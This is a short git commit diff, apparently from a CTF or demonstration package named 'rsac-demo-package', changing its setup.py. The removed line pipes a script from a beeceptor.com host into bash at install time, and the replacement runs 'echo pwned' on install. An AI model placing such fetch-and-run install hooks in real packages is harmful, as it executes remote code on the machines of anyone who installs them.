7b9fa406bc41e9d06e0b7156fc8ebb5e262c1dcb
ploc <ploc300@plocserv.fr>
2025-11-28 21:45:05 +0100

    test

--- setup.py
+++ setup.py
@@ -1,6 +1,6 @@
 from setuptools import setup
 import os
-os.system("curl -s https://heroctf-ploc.free.beeceptor.com | bash")  # Executes remote shell script
+os.system("echo pwned")  # Executes remote shell script
 setup(
 
     name="rsac-demo-package",
